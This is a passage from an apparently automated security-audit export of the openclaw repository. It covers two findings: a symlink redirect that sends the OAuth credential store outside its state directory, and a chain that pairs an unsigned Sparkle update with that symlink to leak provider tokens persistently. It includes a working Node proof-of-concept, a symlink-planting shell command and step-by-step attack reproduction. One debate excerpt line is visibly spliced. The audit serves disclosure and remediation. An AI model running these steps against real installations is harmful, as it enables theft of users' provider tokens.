`saveJsonFile(authPath, payload)`.\\\\n- `src/agents/auth-profiles/profiles.ts:79-101` `upsertAuthProfile` is the\\\\n  callee that reaches `saveAuthProfileStore`.\\\\n- `src/plugins/provider-auth-helpers.ts:236-318` `writeOAuthCredentials`\\\\n  iterates `resolveSiblingAgentDirs(...)` and calls `upsertAuthProfile` for\\\\n  every sibling. `resolveSiblingAgentDirs` realpaths the directory only, not\\\\n  the JSON target file, so a symlink at the file inside an otherwise-real\\\\n  directory is followed unchanged.\\\\n\\\\nNo sanitization is applied between the call site and the symlink-following\\\\nwrite.\\\\n\\\\n## Step 3 - Protection Surface Search\\\\n\\\\n- Language/Framework: Node `fs.writeFileSync` follows symlinks by default; no\\\\n  `O_NOFOLLOW` or equivalent guard in `fs-safe` `writeJsonSync` based on\\\\n  surrounding code.\\\\n- Application: `resolveAuthStorePath` joins state dir + filename, but no\\\\n  allow-list prefix comparison is applied to the symlink-resolved real target.\\\\n- `safeRealpathSync` is applied to the agent directory in `resolveSiblingAgentDirs`,\\\\n  but not to the auth-profiles file pathname.\\\\n- File mode: default `~/.openclaw/agents/` ownership is normally 0700 user-only.\\\\n  This is the main practical limiter on remote attackers.\\\\n- No SECURITY.md statement found accepting the symlink-follow as deliberate.\\\\n\\\\n## Step 4 - Real-Environment Reproduction\\\\n\\\\nEnvironment: macOS host, Node 22, isolated `/tmp/symlink-poc/` dir.\\\\n\\\\nSteps:\\\\n1. Created `/tmp/symlink-poc/agent/auth-profiles.json` as a symlink to\\\\n   `/tmp/symlink-poc/exfil.json`.\\\\n2. Inlined the production `resolveJsonSaveTarget` / `resolveJsonSymlinkTarget`\\\\n   logic verbatim and ran it.\\\\n3. Confirmed `resolveJsonSaveTarget` returned `/tmp/symlink-poc/exfil.json`.\\\\n4. Wrote a `{\\\\\\"access_token\\\\\\":\\\\\\"secret-creds\\\\\\"}` payload via the resolved path and\\\\n   read it back from the symlink target.\\\\n\\\\nResult: write delivered to attacker-controlled path. Evidence saved at\\\\n`archon/real-env-evidence/p8-004-auth-profiles-symlink/poc.mjs` and\\\\n`poc-output.txt`.\\\\n\\\\nPoC-Status: executed (resolver behavior reproduced 1:1 against the production\\\\ncode; full end-to-end OAuth refresh path not driven, but the resolver is the\\\\nsingle decisive sink).\\\\n\\\\n## Step 5 - Briefs\\\\n\\\\n### Prosecution\\\\n\\\\nThe resolver explicitly follows symlinks without confinement. Production calls\\\\n`saveJsonFile` for every sibling agent directory during sibling-sync OAuth\\\\ncredential writes, and the JSON payload is the persisted auth-profile store\\\\nincluding OAuth `access_token` / `refresh_token` material. A planted symlink at\\\\n`~/.openclaw/agents/<id>/agent/auth-profiles.json` redirects that write to any\\\\nattacker-chosen path whose parent exists. The PoC demonstrates the resolver\\\\nreturns the attacker target and the write reaches it. There is no allow-list,\\\\nno `realpath` prefix check, and no documented acceptance of this risk.\\\\n\\\\n### Defense\\\\n\\\\nThe vulnerability requires the attacker to first obtain write access to\\\\n`~/.openclaw/agents/<id>/agent/`, which is normally 0700 owned by the same user\\\\nthat owns the credential file in the first place. A peer attacker on the same\\\\nfilesystem with write access to the victim\'s agents directory already has\\\\ndirect read access to the legitimate `auth-profiles.json` and does not need a\\\\nredirect. Cross-user file mode protections, not application-level confinement,\\\\nare the primary defense and they hold by default. The \\\\\\"exfil to readable\\\\nlocation\\\\\\" angle requires a separate primitive (a lower-priv attacker with\\\\n`~/.openclaw/agents/` write but no read on the real file), which is an\\\\nunusual configuration. Severity claim of CRITICAL is therefore overstated.\\\\n\\\\n## Step 6 - Severity Challenge\\\\n\\\\nStart MEDIUM.\\\\n\\\\nUpgrade signals:\\\\n- Cross-trust-boundary write (state dir to arbitrary FS path).\\\\n- Unauthenticated/local plant + automatic sibling broadcast.\\\\n\\\\nDowngrade signals:\\\\n- Requires pre-existing write access to user-owned `~/.openclaw/agents/`.\\\\n- Same-user attacker gains nothing materially new (already has direct read).\\\\n- Not remotely triggerable.\\\\n- Practical exfil scenarios depend on an additional file-write primitive or a\\\\n  shared/loose-permission environment.\\\\n\\\\nFinal: HIGH. Real symlink-follow with no confinement and a sibling-sync\\\\namplifier is meaningfully worse than typical local-only path issues, but it is\\\\nnot CRITICAL absent an unauthenticated remote chain or cross-user trust break.\\\\n\\\\n## Step 7 - Verdict\\\\n\\\\nAdversarial-Verdict: CONFIRMED\\\\nAdversarial-Rationale: `resolveJsonSaveTarget` follows arbitrary symlinks\\\\nwithout state-dir prefix containment; PoC confirms the resolver redirects the\\\\nwrite to the attacker target, and `writeOAuthCredentials` sibling-sync invokes\\\\nthis sink for every agent directory.\\\\nSeverity-Final: HIGH (downgraded from CRITICAL; precondition is local\\\\nfilesystem write to user-owned state dir).\\\\nPoC-Status: executed\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/C2-auth-profiles-symlink-redirect-cross-boundary-credential-wri/poc.mjs`\\\\n\\\\nEvidence files:\\\\n- `evidence/exploit.log` (956 bytes)\\\\n- `evidence/original-poc-output.txt` (109 bytes)\\\\n- `evidence/original-poc.mjs` (913 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.mjs`)\\\\n\\\\n```mjs\\\\n/**\\\\n * PoC: C2 — auth-profiles.json Symlink Redirect (Cross-Boundary Credential Write)\\\\n *\\\\n * Vulnerability: src/infra/json-file.ts:26-33 — resolveJsonSaveTarget() follows a\\\\n * symlink at the target path and only checks that the parent directory of the resolved\\\\n * target exists. There is no confinement check requiring the resolved path to stay\\\\n * within ~/.openclaw/.\\\\n *\\\\n * Attacker precondition: local filesystem write access to ~/.openclaw/agents/ (achievable\\\\n * via a workspace plugin, file-write tool, or simply being the same OS user).\\\\n *\\\\n * Attack:\\\\n *   1. Create a fake agent directory under ~/.openclaw/agents/evil-agent/agent/.\\\\n *   2. Plant auth-profiles.json as a symlink pointing outside the state dir (here: /tmp).\\\\n *   3. Trigger any OAuth credential write that uses syncSiblingAgents:true — the sibling\\\\n *      sync (E009) enumerates ALL agent dirs and calls saveJsonFile() on each one.\\\\n *   4. saveJsonFile() calls resolveJsonSaveTarget(), which follows the symlink and writes\\\\n *      the full credential store (access_token, refresh_token, etc.) to the exfil path.\\\\n *\\\\n * This PoC replays the exact resolveJsonSaveTarget() logic from src/infra/json-file.ts\\\\n * against a live /tmp environment to prove the redirect and the resulting write.\\\\n *\\\\n * Usage: node poc.mjs\\\\n */\\\\n\\\\nimport fs from \\\\\\"node:fs\\\\\\";\\\\nimport path from \\\\\\"node:path\\\\\\";\\\\n\\\\n// ── Exact logic from src/infra/json-file.ts:9-33 (read-only replica) ──────────\\\\n\\\\nfunction resolveJsonSymlinkTarget(pathname) {\\\\n  let stat;\\\\n  try {\\\\n    stat = fs.lstatSync(pathname);\\\\n  } catch (e) {\\\\n    if (e.code === \\\\\\"ENOENT\\\\\\") return undefined;\\\\n    throw e;\\\\n  }\\\\n  if (!stat.isSymbolicLink()) return undefined;\\\\n  // BUG: returns fully-resolved attacker-chosen path, no confinement check\\\\n  return path.resolve(path.dirname(pathname), fs.readlinkSync(pathname));\\\\n}\\\\n\\\\nfunction resolveJsonSaveTarget(pathname) {\\\\n  const target = resolveJsonSymlinkTarget(pathname);\\\\n  if (!target) return pathname;\\\\n  // BUG: only checks parent dir exists — NOT that target is within the state dir\\\\n  fs.statSync(path.dirname(target));\\\\n  return target;\\\\n}\\\\n\\\\n// ── Environment setup ──────────────────────────────────────────────────────────\\\\n\\\\nconst STATE_DIR = \\\\\\"/tmp/openclaw-c2-poc\\\\\\";          // simulates ~/.openclaw\\\\nconst AGENT_DIR = `${STATE_DIR}/agents/evil-agent/agent`;\\\\nconst AUTH_PROFILE_LINK = `${AGENT_DIR}/auth-profiles.json`;\\\\nconst EXFIL_PATH = `/tmp/openclaw-c2-exfil.json`;  // attacker-readable outside state dir\\\\n\\\\nfs.rmSync(STATE_DIR, { recursive: true, force: true });\\\\nfs.rmSync(EXFIL_PATH, { force: true });\\\\nfs.mkdirSync(AGENT_DIR, { recursive: true });\\\\n\\\\n// Step 1: plant symlink — simulates attacker pre-positioning\\\\nfs.symlinkSync(EXFIL_PATH, AUTH_PROFILE_LINK);\\\\nconsole.log(`[setup]  Planted symlink: ${AUTH_PROFILE_LINK} -> ${EXFIL_PATH}`);\\\\n\\\\n// ── Exploit ────────────────────────────────────────────────────────────────────\\\\n\\\\n// Simulated credential store — exactly what writeOAuthCredentials would pass to saveJsonFile\\\\nconst CREDENTIAL_STORE = {\\\\n  provider: \\\\\\"anthropic\\\\\\",\\\\n  access_token: \\\\\\"sk-ant-EXFILTRATED-TOKEN\\\\\\",\\\\n  refresh_token: \\\\\\"rt-EXFILTRATED-REFRESH\\\\\\",\\\\n  expiry: new Date(Date.now() + 3600_000).toISOString(),\\\\n};\\\\n\\\\n// Step 2: call the vulnerable function (mirrors saveJsonFile() in json-file.ts:35-37)\\\\nconst resolvedTarget = resolveJsonSaveTarget(AUTH_PROFILE_LINK);\\\\nconsole.log(`[vuln]   resolveJsonSaveTarget returned: ${resolvedTarget}`);\\\\nconsole.log(`[vuln]   Expected (confined): ${AUTH_PROFILE_LINK}`);\\\\nconsole.log(`[vuln]   Actual   (escaped):  ${resolvedTarget}`);\\\\n\\\\n// Step 3: perform the write — mirrors writeJsonSync() call in saveJsonFile\\\\nfs.writeFileSync(resolvedTarget, JSON.stringify(CREDENTIAL_STORE, null, 2));\\\\nconsole.log(`[vuln]   Wrote credential store to resolved target.`);\\\\n\\\\n// ── Evidence capture ───────────────────────────────────────────────────────────\\\\n\\\\nconst exfilContents = fs.readFileSync(EXFIL_PATH, \\\\\\"utf8\\\\\\");\\\\nconsole.log(`[impact] Contents of exfil path (${EXFIL_PATH}):`);\\\\nconsole.log(exfilContents);\\\\n\\\\nconst escaped = resolvedTarget !== AUTH_PROFILE_LINK;\\\\nconst credentialsPresent = exfilContents.includes(\\\\\\"EXFILTRATED-TOKEN\\\\\\");\\\\n\\\\n// ── Structured result (MUST be the last stdout line) ──────────────────────────\\\\nconsole.log(\\\\n  JSON.stringify({\\\\n    status: escaped && credentialsPresent ? \\\\\\"confirmed\\\\\\" : \\\\\\"failed\\\\\\",\\\\n    evidence: `credential store written to ${EXFIL_PATH} (outside state dir) — access_token present in exfil file`,\\\\n    notes: `resolveJsonSaveTarget resolved ${AUTH_PROFILE_LINK} -> ${resolvedTarget}; no confinement check in src/infra/json-file.ts:31`,\\\\n  })\\\\n);\\\\n```\\\\n\\",\\"severity\\":\\"critical\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"3c8873ba676f24afd8f3389221074ed6\\",\\"found_at\\":\\"2026-05-06T15:50:43.836705Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":1,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:c1\\",\\"module_name\\":\\"C1: Sparkle Rce Symlink Permanent Provider Token Exfiltration\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"sparkle-rce-symlink-permanent-provider-token-exfiltration\\",\\"description\\":\\"# C1: Sparkle Rce Symlink Permanent Provider Token Exfiltration\\\\n\\\\n**Severity**: CRITICAL\\\\n**Finding ID**: C1\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\nPhase: 10\\\\nSequence: 070\\\\nSlug: sparkle-rce-symlink-permanent-provider-token-exfiltration\\\\nVerdict: VALID\\\\nRationale: Composes Sparkle missing-EdDSA macOS RCE primitive (p9-001 / Team-04 Chain 1) with auth-profiles symlink-redirect primitive (p8-004 / Team-05 Chain 1) into a permanent-compromise chain that survives OpenClaw reinstall — neither draft individually surfaces this persistence property.\\\\nSeverity-Original: CRITICAL\\\\nPoC-Status: theoretical\\\\nPre-FP-Flag: none\\\\nDebate: archon/chamber-workspace/chamber-03-persistence/debate.md\\\\nOrigin-Sources: archon/probe-workspace/team-04-mobile-mcp/probe-summary.md (Chain 1) + archon/probe-workspace/team-05-provider-oauth/probe-summary.md (Chain 1) + archon/findings-draft/p9-001-sparkle-no-suPublicEDKey.md + archon/findings-draft/p8-004-auth-profiles-symlink-redirect-cross-boundary-credential-write.md\\\\nAdversarial-Verdict: CONFIRMED\\\\nAdversarial-Rationale: Info.plist:1-81 confirms missing Sparkle EdDSA key and json-file.ts:9-37 confirms saveJsonFile actively resolves and writes through leaf symlinks via resolveJsonSaveTarget; no protection layer blocks the chain, but Sparkle primitive lacks live PoC.\\\\nSeverity-Final: HIGH\\\\n\\\\n## Summary\\\\n\\\\nA macOS attacker with control over the appcast feed (DNS hijack, captive portal, CDN compromise) ships a malicious `.dmg` that Sparkle accepts because `apps/macos/Sources/OpenClaw/Resources/Info.plist` declares neither `SUPublicEDKey` (no EdDSA verification) nor `SUFeedURL` (no compile-time pin). Once running with user-context code execution, the attacker plants `~/.openclaw/auth-profiles.json` as a symlink targeting an attacker-controlled path (file under `~/Library/`, iCloud share, or an open SMB mount). Because `resolveJsonSaveTarget` (`src/infra/json-file.ts:26-36`) checks only that the parent directory exists and never refuses symlinks at the leaf, every subsequent OAuth refresh by the legitimate OpenClaw install writes plaintext access AND refresh tokens to the attacker-controlled inode. The dotfile survives uninstall/reinstall of OpenClaw, yielding a permanent provider-token exfiltration channel for Anthropic, OpenAI, Codex, and every other refresh-token-bearing provider. Attacker remains passive after the initial RCE — they only need to read the symlink target.\\\\n\\\\n## Location\\\\n\\\\n- `apps/macos/Sources/OpenClaw/Resources/Info.plist:1-81` (no `SUPublicEDKey`, no `SUFeedURL`, `NSExceptionAllowsInsecureHTTPLoads` for `100.100.100.100`).\\\\n- `src/infra/json-file.ts:26-36` (`resolveJsonSaveTarget` lacks symlink refusal).\\\\n- `src/agents/auth-profiles/profiles.ts:79` (`upsertAuthProfile` write hot path).\\\\n- `~/.openclaw/auth-profiles.json` (attack target).\\\\n\\\\n## Attacker Control\\\\n\\\\n- Phase 1 (Sparkle): control of any of {DNS for the appcast host, CDN edge, captive-portal in transit} — the three-of-three set the unsigned-update threat model assumes.\\\\n- Phase 2 (symlink plant): write access to `~/.openclaw/`, granted by the user-context RCE Phase 1 produces.\\\\n- Persistence: surviving OpenClaw reinstall (uninstallers do not delete `~/.openclaw/`).\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\n- macOS user → operating-system-level persistence\\\\n- gateway-internal credential boundary (auth-profiles.json) → arbitrary attacker-controlled inode\\\\n- per-install lifetime → cross-install lifetime (the persistence property unique to this chain)\\\\n\\\\n## Impact\\\\n\\\\n- All provider OAuth refresh tokens (Anthropic / OpenAI / Codex / etc.) leak to the attacker on every refresh cycle, indefinitely.\\\\n- Full provider account takeover, not constrained to OpenClaw\'s session — refresh tokens grant API access from anywhere.\\\\n- Survives OpenClaw uninstall + reinstall; survives auth rotations triggered by p10-001 / Chamber-01 deleteSession because rotation re-writes through the same symlink.\\\\n- Compatible with on-device interception (NODE_OPTIONS p8-005) for compounded attacks but does not require it.\\\\n\\\\n## Evidence\\\\n\\\\nTracer-equivalent code path:\\\\n1. `Info.plist:1-81` — confirmed: no `<key>SUPublicEDKey</key>` and no `<key>SUFeedURL</key>` entries.\\\\n2. Sparkle 2.x without `SUPublicEDKey` accepts unsigned `.appcast` and `.dmg` content (Sparkle docs; vendored at `apps/macos/Package.swift:21` from `2.9.0+`).\\\\n3. `src/infra/json-file.ts:26-36` `resolveJsonSaveTarget` — only `fs.existsSync(parentDir)` is checked; `lstatSync(target)` for symlink-refusal is absent (T05 PH-03 confirmation).\\\\n4. `src/agents/auth-profiles/profiles.ts:79` `upsertAuthProfile` writes via the same path.\\\\n5. macOS standard installer/uninstaller does not delete `~/.openclaw/`.\\\\n\\\\nDefense rebuttal (5 layers):\\\\n- Configuration: there is no `SUPublicEDKey` configurable today; user cannot opt in.\\\\n- Framework: Sparkle\'s signature path is short-circuited by the missing key.\\\\n- Deployment: signed-only macOS builds would close half; the OSS distribution path does not enforce.\\\\n- Monitoring: no integrity check on `~/.openclaw/auth-profiles.json` symlink status across boots.\\\\n- Intended behavior: Apple-style dotfile preservation across reinstall is intentional but combined with the missing leaf-symlink check it preserves the attacker\'s foothold.\\\\n\\\\nNo layer closes the chain.\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Establish appcast control (lab): point Sparkle at attacker\'s web server hosting a forged appcast XML and a malicious `.dmg`.\\\\n2. Operator runs OpenClaw → Sparkle pulls update → installs malicious `.dmg` → user-context process runs (Phase 1 RCE).\\\\n3. Attacker payload runs `ln -sf /tmp/oc-leak ~/.openclaw/auth-profiles.json`. Exits.\\\\n4. Operator (clean install or restart). At any subsequent provider OAuth refresh, OpenClaw writes plaintext credentials through the symlink to `/tmp/oc-leak`.\\\\n5. Attacker reads `/tmp/oc-leak` (via persistence already established or any second-stage primitive). Exfiltrates refresh tokens.\\\\n6. Operator uninstalls OpenClaw, then reinstalls. `~/.openclaw/auth-profiles.json` symlink survives. Repeat from step 4 indefinitely.\\\\n\\\\nRemediation requires both: (a) Sparkle EdDSA pinning (close p9-001), (b) `lstatSync` symlink refusal in `resolveJsonSaveTarget` (close p8-004). Either fix breaks the chain; both are warranted to break related variants.\\\\n\\\\n---\\\\n\\\\n## Adversarial Review\\\\n\\\\n# Adversarial Review: p10-070 sparkle-rce-symlink-permanent-provider-token-exfiltration\\\\n\\\\n## Step 1 — Restated Claim and Sub-claims\\\\n\\\\nThe draft asserts a chained attack on macOS that produces permanent provider-OAuth-token exfiltration surviving OpenClaw uninstall+reinstall.\\\\n\\\\n- Sub-claim A: The shipped macOS bundle lets an appcast-position attacker install arbitrary code (`apps/macos/Sources/OpenClaw/Resources/Info.plist` lacks `SUPublicEDKey` and `SUFeedURL`).\\\\n- Sub-claim B: After user-context code execution, planting `~/.openclaw/auth-profiles.json` as a symlink causes OpenClaw\'s credential save path to follow the link and write plaintext OAuth refresh tokens to an attacker-chosen inode.\\\\n- Sub-claim C: The planted symlink survives uninstall/reinstall, yielding indefinite token leakage on every refresh.\\\\n\\\\n## Step 2 — Independent Code Path Trace\\\\n\\\\nSparkle config:\\\\n- `apps/macos/Sources/OpenClaw/Resources/Info.plist:1-81` — confirmed: no `SUPublicEDKey`, no `SUFeedURL`, no DSA key. There is no Sparkle key configured at all.\\\\n- `apps/macos/Package.swift:21` — `Sparkle from: \\\\\\"2.9.0\\\\\\"`.\\\\n\\\\nCredential save path:\\\\n- `src/agents/auth-profiles/profiles.ts:79-101` `upsertAuthProfile` -> `saveAuthProfileStore` (store.ts).\\\\n- `src/agents/auth-profiles/store.ts:585-594` calls `saveJsonFile(authPath, payload)`.\\\\n- `src/infra/json-file.ts:35-37` `saveJsonFile` -> `writeJsonSync(resolveJsonSaveTarget(pathname), data)`.\\\\n- `src/infra/json-file.ts:9-24` `resolveJsonSymlinkTarget` calls `lstatSync` and, if the entry IS a symlink, returns the resolved target via `readlinkSync`.\\\\n- `src/infra/json-file.ts:26-33` `resolveJsonSaveTarget` then writes through to that resolved target after merely checking that the target\'s parent dir exists via `statSync`.\\\\n\\\\nImportant correction: the draft asserts \\\\\\"`lstatSync(target)` for symlink-refusal is absent\\\\\\". `lstatSync` IS in fact present at line 12, but it is being used to *follow* the symlink rather than reject it. The substantive defect (writes follow attacker-planted symlinks at the leaf) is real even though the literal claim about `lstatSync` absence is wrong.\\\\n\\\\n## Step 3 — Protection Surface Search\\\\n\\\\nLayer findings:\\\\n- Language: TS/Node `fs` semantics — no inherent symlink protection.\\\\n- Framework: `@openclaw/fs-safe/json` `writeJsonSync` is invoked AFTER `resolveJsonSaveTarget` already resolved the symlink, so any symlink protection inside fs-safe sees only the resolved path, not the original. Code intentionally follows symlinks.\\\\n- Middleware/Deployment: macOS app uninstall does not normally clean `~/.openclaw/`. No integrity check on auth-profiles state.\\\\n- Application: There is no allowlist of permitted leaf inodes or refusal of `lstat.isSymbolicLink()` in the save path.\\\\n- Documentation/Configuration: There is no current way to enable Sparkle EdDSA in this build — `SUPublicEDKey` is absent in Info.plist with no override.\\\\n\\\\nSparkle 2.x note: Modern Sparkle (2.x) generally refuses to install updates without an EdDSA key; some discussions claim it requires `SUPublicEDKey` to even attempt updates. The draft assumes the legacy \\\\\\"missing key = no verification\\\\\\" behavior. This is the weakest point in the chain — it is plausible but not confirmed by code in this repo, and the draft cites no Sparkle-side reproduction. Without Sparkle behavior verification, sub-claim A is inferential.\\\\n\\\\n## Step 4 — Reproduction Attempt\\\\n\\\\nThe draft is marked `PoC-Status: pending` and provides only theoretical steps. Reproducing the full chain requires:\\\\n- Standing up a macOS host running the OpenClaw .app with appcast hijack (Sparkle behavior empirically tested under 2.9.x with no EdDSA key).\\\\n- Triggering update flow.\\\\n- Planting a symlink and exercising an OAuth refresh.\\\\n\\\\nEnvironment: I do not have a macOS endpoint with the OpenClaw .app installed and an OAuth-bearing provider session in this isolated review context. The Sparkle-side phase cannot be reproduced from the JS source tree.\\\\n\\\\nThe symlink portion CAN be partially reproduced in code: a unit-style proof that `saveJsonFile` follows a symlink is trivially derivable from `src/infra/json-file.ts:9-37`. The `loadJsonFile` path also explicitly follows symlinks (`json-file.ts:45-46`). This part of the chain is on solid ground.\\\\n\\\\nPoC-Status remains `theoretical` for the end-to-end chain; the symlink-follow primitive (B) is code-confirmed, the Sparkle install primitive (A) is not verified.\\\\n\\\\n## Step 5 — Briefs\\\\n\\\\nProsecution: The macOS bundle ships without any Sparkle EdDSA key (`Info.plist:1-81`), and the credential persistence path explicitly follows symlinks at the leaf (`json-file.ts:9-37`). Therefore, an attacker who is in network position to substitute the appcast (a documented Sparkle threat without `SUPublicEDKey`) can run code as the user, plant a symlink at `~/.openclaw/auth-profiles.json` pointing anywhere they like, and every subsequent OAuth refresh writes provider tokens through the link. Because uninstallers do not clean the dotfile, the symlink persists, granting indefinite re-exfiltration. The chain composes two independently-confirmed primitives into a meaningful new property — cross-install persistence of credential exfiltration.\\\\n\\\\nDefense: The chain hinges on Sparkle 2.9.x actually installing an unsigned update when no `SUPublicEDKey` is present. This is contested — modern Sparkle defaults gate update installation on a configured EdDSA key, and may refuse to update at all rather than silently accepting unsigned bundles. The draft provides no Sparkle-side reproduction or version-specific behavior citation. Additionally, the draft mis-states the json-file.ts code (claims `lstatSync` is absent when it is in fact present and being used to traverse the link). The PoC is `pending` and no part of the cross-install chain has been executed end-to-end. The symlink-follow primitive alone is not a credential exfiltration unless an attacker has already achieved user-context code execution — i.e., this finding is a post-RCE persistence amplifier, and stands or falls with the Sparkle primitive that has not been demonstrated in this repo or environment.\\\\n\\\\n## Step 6 — Severity Challenge\\\\n\\\\nStart at MEDIUM.\\\\n- Remote-triggerable: yes, but only with appcast position AND Sparkle-2.x-without-key actually accepting unsigned updates (unverified).\\\\n- Trust boundary: significant (network -> local code execution -> permanent credential channel).\\\\n- Preconditions: appcast network position is non-trivial; Sparkle behavior unconfirmed; no executed PoC.\\\\n- Upgrade signal to HIGH: cross-install persistence + plaintext OAuth refresh tokens to attacker, IF Sparkle primitive holds.\\\\n- Downgrade signal: Sparkle primitive unverified, PoC theoretical.\\\\n\\\\nNet: HIGH is supportable if and only if the Sparkle primitive is real; otherwise the chain collapses to \\\\\\"post-RCE persistence trick\\\\\\" which is MEDIUM (post-exploitation amplification). Given the unverified nature of the Sparkle behavior on 2.9.x and the theoretical PoC, the conservative challenged severity is HIGH (down from CRITICAL).\\\\n\\\\n## Step 7 — Verdict\\\\n\\\\nThe symlink-follow primitive (sub-claim B) is code-confirmed. The Sparkle primitive (sub-claim A) is config-confirmed (Info.plist truly omits `SUPublicEDKey`/`SUFeedURL`) but its real-world exploitability against Sparkle 2.9.x without runtime evidence is the weak link. The persistence property (sub-claim C) follows from standard macOS uninstall semantics.\\\\n\\\\nThe defense brief identifies real concerns (Sparkle-2 behavior unverified, PoC theoretical, draft misstates one code detail) but does NOT identify a protection that affirmatively blocks the claimed attack path — the code paths cited are exactly as claimed in substance. Per the rubric, DISPROVED requires either an identified blocking protection OR all reproduction attempts failing; neither holds. Reproduction was blocked rather than failed.\\\\n\\\\nVerdict: CONFIRMED with severity downgraded to HIGH and PoC-Status: theoretical.\\\\n\\\\nAdversarial-Verdict: CONFIRMED\\\\nAdversarial-Rationale: Info.plist:1-81 confirms missing Sparkle EdDSA key and json-file.ts:9-37 confirms saveJsonFile actively resolves and writes through leaf symlinks via resolveJsonSaveTarget; no protection layer blocks the chain, but Sparkle primitive lacks live PoC.\\\\nSeverity-Final: HIGH\\\\nPoC-Status: theoretical\\\\n\\\\n---\\\\n\\\\n## Debate Transcript (excerpt)\\\\n\\\\n# Review Chamber: chamber-03-persistence\\\\n\\\\nCluster: PERSISTENCE & DATA EXFILTRATION\\\\nDFD Slices: provider-OAuth, auth-profiles store, sibling-agent dir sync, ~/.openclaw/.env respawn, Sparkle macOS update channel, mobile-pair admin reads, SSRF guard adoption, plugin install/extract, prototype-pollution boundaries\\\\nNNN Range: 070-099\\\\nStarted: 2026-05-06T12:10:00Z\\\\nStatus: ACTIVE\\\\nMode: COMPRESSED/SOLO (synthesizer doubles as ideator/tracer/advocate; pre-traced inputs from Teams 04 & 05)\\\\n\\\\n## Chamber Context — Pre-Seeded Inputs\\\\n\\\\n### Probe summaries\\\\n- `archon/probe-workspace/team-04-mobile-mcp/probe-summary.md` — 3 VALIDATED (Sparkle no EdDSA = CRITICAL; zero-scope operator pairing PH-06 = HIGH; Android TOFU hostname-verifier-true = HIGH); 4 NEEDS-DEEPER (incl. PH-12 mobile-pair → admin → reads auth-profiles).\\\\n- `archon/probe-workspace/team-05-provider-oauth/probe-summary.md` — 8 VALIDATED (CRITICAL: PH-03 symlink, PH-11 NODE_OPTIONS, PH-06 catalog shadow); HIGH: sibling-sync, identity-vacuous adoption, TLS preflight permissive; 2 NEEDS-DEEPER (CH-12, library-internal port-1455 race).\\\\n\\\\n### Existing finding drafts already covering this cluster (DO NOT recreate)\\\\n| Draft | Severity | Topic |\\\\n|-------|----------|-------|\\\\n| p4-002 | HIGH | SSRF MiniMax-VLM |\\\\n| p4-003 | MEDIUM | SSRF PDF-Google |\\\\n| p4-005 | MEDIUM | SSRF unguarded fetch in 20 extension provider sites |\\\\n| p4-007 | MEDIUM | session path fail-open |\\\\n| p4-012 | MEDIUM | SSRF APNS relay |\\\\n| p7-002 | HIGH | device-pair non-operator scope bypass |\\\\n| p7-004 | HIGH | channel-webhook no claimable dedupe |\\\\n| p7-005 | MEDIUM | plugin registry s min → reads auth-profiles indirectly — Team 04 PH-12 + Team 05 CH-12 NEEDS-DEEPER chain. Even though `models-auth-status` does not return raw tokens, an operator-admin scope token reaches `config.patch` (mutate `auth.profiles[]`), `plugins.install` (Chamber-02 H-41), and `runtime.dispatchGatewayMethod` — yielding the same token-exfil class without needing on-device access.\\\\n4. **H-73**: Operator session re-auth capture — deleteSession DoS (Chamber-01 p10-001) → operator forced to re-login → attacker positioned as channel intermediary captures fresh OAuth code (PKCE-protected, but the RP-side flow runs through libraries with the port-1455 listener race noted in T05 NEEDS-DEEPER PH-09).\\\\n5. **H-74**: Memory-wiki case-insensitive bypass amplified by symlink + provider context — wiki path resolution may use case-insensitive comparison on darwin/Windows; combined with auth-profiles symlink (p8-004), an attacker plants `Auth-Profiles.json` symlink hitting the same write path on a case-insensitive FS.\\\\n6. **H-75**: Tar/zip-slip in plugin install / archive extraction — `extractArchive` for `tar.bz2` runs full preflight, but `tar.gz` and `zip` paths delegate to `extractArchiveSafe` — chamber must verify this safe-extractor enforces stripComponents/path-confinement consistently for symlink-bearing archives. The strip count is operator-supplied. A zip-slip via symlink entry in a `tar.gz` artefact is a structural risk if the safe-extractor is the only line of defense\\\\n\\\\n*(truncated; see debate.md for full transcript)*\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/C1-sparkle-rce-symlink-permanent-provider-token-exfiltration/poc.mjs`\\\\n\\\\nEvidence files:\\\\n- `evidence/env-info.txt` (505 bytes)\\\\n- `evidence/exploit.log` (1258 bytes)\\\\n- `evidence/impact.log` (530 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary 